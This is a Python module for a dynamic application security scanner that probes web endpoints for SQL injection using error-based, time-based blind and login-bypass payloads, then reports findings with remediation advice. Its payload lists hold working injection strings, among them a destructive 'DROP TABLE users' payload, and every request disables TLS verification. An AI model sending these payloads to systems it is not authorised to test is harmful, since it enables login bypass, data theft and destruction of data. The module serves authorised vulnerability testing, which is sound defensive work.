"""
DAST SQL Injection Scanner Module
Tests endpoints for SQL injection vulnerabilities using error-based,
time-based blind, and authentication bypass payloads.
"""

import requests
import time
import logging
from urllib.parse import urljoin, urlparse, urlencode, parse_qs

logger = logging.getLogger(__name__)

# ------------------------------------
# SQL Injection Payloads
# ------------------------------------
ERROR_BASED_PAYLOADS = [
    "' OR 1=1--",
    '" OR 1=1#',
    "admin' --",
    "' OR ''='",
    "1' OR '1'='1",
    "' UNION SELECT NULL--",
    "') OR ('1'='1",
    "1; DROP TABLE users--",
    "' AND 1=CONVERT(int, @@version)--",
    "' OR 1=1/*",
]

TIME_BASED_PAYLOADS = [
    "1' AND SLEEP(5)--",
    "1' WAITFOR DELAY '0:0:5'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1'; WAITFOR DELAY '0:0:5';--",
]

AUTH_BYPASS_PAYLOADS = [
    "admin' --",
    "admin'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin' OR '1'='1",
    "') OR ('1'='1'--",
]

# ------------------------------------
# SQL Error Signatures
# ------------------------------------
SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "microsoft ole db provider for sql server",
    "microsoft sql native client error",
    "invalid query",
    "sql command not properly ended",
    "ora-01756",
    "ora-00933",
    "pg_query",
    "pg_exec",
    "postgresql",
    "syntax error at or near",
    "sqlite3.operationalerror",
    "sqlite error",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "mysqli_fetch",
    "jdbc.sqlex",
    "sqlexception",
    "com.mysql.jdbc",
    "org.postgresql",
    "microsoft access driver",
    "jet database engine",
    "odbc sql server driver",
    "sql server",
    "invalid column name",
    "unknown column",
    "division by zero",
    "supplied argument is not a valid mysql",
    "db2 sql error",
]


class SQLiScanner:
    """SQL Injection vulnerability scanner."""

    def __init__(self, timeout=10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0.0.0 Safari/537.36"
            )
        })

    def scan(self, endpoints, target_url):
        """
        Scan all endpoints for SQL injection vulnerabilities.

        Args:
            endpoints: List of endpoint dicts from crawler
            target_url: Base target URL

        Returns:
            List of vulnerability dicts in standard format
        """
        vulnerabilities = []

        for endpoint in endpoints:
            ep_url = endpoint.get("endpoint", target_url)
            method = endpoint.get("method", "GET").upper()
            params = endpoint.get("parameters", [])

            for param in params:
                param_name = param.get("name", "")
                if not param_name:
                    continue

                # Skip non-injectable parameter types
                if param.get("type") in ["hidden", "submit", "button", "file", "image"]:
                    if param.get("type") == "hidden" and "csrf" in param_name.lower():
                        continue

                # Error-based SQLi tests
                vulns = self._test_error_based(ep_url, method, param_name)
                vulnerabilities.extend(vulns)

                # Time-based blind SQLi tests
                vulns = self._test_time_based(ep_url, method, param_name)
                vulnerabilities.extend(vulns)

                # Auth bypass tests (only for login-like forms)
                if param.get("type") in ["text", "password", "email"] or \
                   param_name.lower() in ["username", "user", "email", "login", "password", "pass"]:
                    vulns = self._test_auth_bypass(ep_url, method, param_name)
                    vulnerabilities.extend(vulns)

        return vulnerabilities

    def _test_error_based(self, url, method, param_name):
        """Test for error-based SQL injection with dual-baseline to reduce false positives."""
        vulnerabilities = []

        # Dual baseline: clean value + non-SQL noise value
        baseline = self._make_request(url, method, {param_name: "testvalue123"})
        if not baseline:
            return vulnerabilities
        noise_baseline = self._make_request(url, method, {param_name: "§§§%%%&&&"})

        # Collect error signatures that already exist in baseline (false positive filter)
        baseline_lower = baseline.text.lower()
        noise_lower = noise_baseline.text.lower() if noise_baseline else ""
        baseline_errors = {sig for sig in SQL_ERROR_SIGNATURES if sig in baseline_lower or sig in noise_lower}

        for payload in ERROR_BASED_PAYLOADS:
            try:
                response = self._make_request(url, method, {param_name: payload})
                if not response:
                    continue

                response_lower = response.text.lower()

                # Only flag errors that are NEW (not in baseline or noise)
                found_errors = [
                    sig for sig in SQL_ERROR_SIGNATURES
                    if sig in response_lower and sig not in baseline_errors
                ]

                if found_errors:
                    vulnerabilities.append({
                        "name": "SQL Injection (Error-Based)",
                        "severity": "Critical",
                        "location": url,
                        "parameter": param_name,
                        "description": (
                            f"SQL error messages detected when injecting payload "
                            f"into parameter '{param_name}'. The application reveals "
                            f"database error information, confirming SQL injection."
                        ),
                        "impact": (
                            "An attacker can extract sensitive data from the database, "
                            "modify or delete records, and potentially execute system "
                            "commands on the database server."
                        ),
                        "recommendation": (
                            "Use parameterized queries (prepared statements) instead "
                            "of string concatenation. Implement input validation and "
                            "disable verbose error messages in production."
                        ),
                        "evidence": (
                            f"Payload: {payload} | "
                            f"SQL errors found: {', '.join(found_errors[:3])}"
                        ),
                    })
                    break

                # Auth bypass: require BOTH status code change AND auth indicators
                if baseline.status_code != response.status_code:
                    if response.status_code in [200, 302] and baseline.status_code in [401, 403]:
                        resp_lower = response.text.lower()
                        auth_indicators = ["welcome", "dashboard", "logout", "my account", "admin"]
                        if any(ind in resp_lower for ind in auth_indicators):
                            vulnerabilities.append({
                                "name": "SQL Injection (Authentication Bypass)",
                                "severity": "Critical",
                                "location": url,
                                "parameter": param_name,
                                "description": (
                                    f"Status code changed from {baseline.status_code} to "
                                    f"{response.status_code} with auth indicators in response "
                                    f"when injecting SQL payload into '{param_name}'."
                                ),
                                "impact": (
                                    "An attacker can bypass authentication and gain "
                                    "unauthorized access to protected resources."
                                ),
                                "recommendation": (
                                    "Use parameterized queries for all authentication logic. "
                                    "Never construct SQL queries using user input directly."
                                ),
                                "evidence": (
                                    f"Payload: {payload} | "
                                    f"Status changed: {baseline.status_code} -> {response.status_code} | "
                                    f"Auth indicators found in response"
                                ),
                            })
                            break

            except Exception as e:
                logger.debug(f"Error testing SQLi on {url}: {e}")

        return vulnerabilities

    def _test_time_based(self, url, method, param_name):
        """Test for time-based blind SQL injection."""
        vulnerabilities = []
        delay_threshold = 4  # seconds

        for payload in TIME_BASED_PAYLOADS:
            try:
                start_time = time.time()
                response = self._make_request(
                    url, method, {param_name: payload}, timeout=15
                )
                elapsed = time.time() - start_time

                if elapsed >= delay_threshold:
                    # Confirm with a second test
                    start_time2 = time.time()
                    self._make_request(
                        url, method, {param_name: payload}, timeout=15
                    )
                    elapsed2 = time.time() - start_time2

                    if elapsed2 >= delay_threshold:
                        vulnerabilities.append({
                            "name": "SQL Injection (Time-Based Blind)",
                            "severity": "Critical",
                            "location": url,
                            "parameter": param_name,
                            "description": (
                                f"Time-based blind SQL injection detected in parameter "
                                f"'{param_name}'. Response was delayed by {elapsed:.1f}s, "
                                f"confirmed with second test ({elapsed2:.1f}s delay)."
                            ),
                            "impact": (
                                "An attacker can extract the entire database contents "
                                "character by character using time-based techniques, "
                                "including usernames, passwords, and sensitive data."
                            ),
                            "recommendation": (
                                "Use parameterized queries (prepared statements). "
                                "Implement query timeout limits. Use a Web Application "
                                "Firewall (WAF) to detect and block injection attempts."
                            ),
                            "evidence": (
                                f"Payload: {payload} | "
                                f"Response delays: {elapsed:.1f}s, {elapsed2:.1f}s "
                                f"(threshold: {delay_threshold}s)"
                            ),
                        })
                        return vulnerabilities  # One time-based finding is enough

            except requests.exceptions.Timeout:
                # Timeout itself can indicate time-based SQLi
                vulnerabilities.append({
                    "name": "SQL Injection (Time-Based Blind - Suspected)",
                    "severity": "High",
                    "location": url,
                    "parameter": param_name,
                    "description": (
                        f"Request timed out when injecting time-based SQL payload "
                        f"into parameter '{param_name}', suggesting possible blind "
                        f"SQL injection."
                    ),
                    "impact": (
                        "Potential database data extraction through time-based "
                        "blind injection techniques."
                    ),
                    "recommendation": (
                        "Use parameterized queries. Investigate the parameter "
                        "for SQL injection manually."
                    ),
                    "evidence": f"Payload: {payload} | Request timed out",
                })
                return vulnerabilities

            except Exception as e:
                logger.debug(f"Error testing time-based SQLi: {e}")

        return vulnerabilities

    def _test_auth_bypass(self, url, method, param_name):
        """Test for SQL injection authentication bypass."""
        vulnerabilities = []

        for payload in AUTH_BYPASS_PAYLOADS:
            try:
                response = self._make_request(url, method, {param_name: payload})
                if not response:
                    continue

                # Look for signs of successful login
                response_lower = response.text.lower()
                bypass_indicators = [
                    "welcome", "dashboard", "logout", "my account",
                    "profile", "logged in", "admin panel",
                ]

                if any(indicator in response_lower for indicator in bypass_indicators):
                    if response.status_code in [200, 302]:
                        vulnerabilities.append({
                            "name": "SQL Injection (Login Bypass)",
                            "severity": "Critical",
                            "location": url,
                            "parameter": param_name,
                            "description": (
                                f"Authentication bypass detected using SQL injection "
                                f"payload in parameter '{param_name}'. The application "
                                f"appears to grant access without valid credentials."
                            ),
                            "impact": (
                                "Complete authentication bypass allowing unauthorized "
                                "access to user accounts including admin accounts. "
                                "Full data breach potential."
                            ),
                            "recommendation": (
                                "Use parameterized queries for all authentication queries. "
                                "Implement multi-factor authentication. Use an ORM "
                                "with proper query building."
                            ),
                            "evidence": (
                                f"Payload: {payload} | "
                                f"Status: {response.status_code} | "
                                f"Login bypass indicators found in response"
                            ),
                        })
                        return vulnerabilities

            except Exception as e:
                logger.debug(f"Error testing auth bypass: {e}")

        return vulnerabilities

    def _make_request(self, url, method, params, timeout=None):
        """Make an HTTP request with the given parameters."""
        timeout = timeout or self.timeout

        try:
            if method == "GET":
                return self.session.get(url, params=params, timeout=timeout, verify=False)
            elif method == "POST":
                return self.session.post(url, data=params, timeout=timeout, verify=False)
            else:
                return self.session.get(url, params=params, timeout=timeout, verify=False)
        except requests.exceptions.Timeout:
            raise
        except Exception as e:
            logger.debug(f"Request error: {e}")
            return None
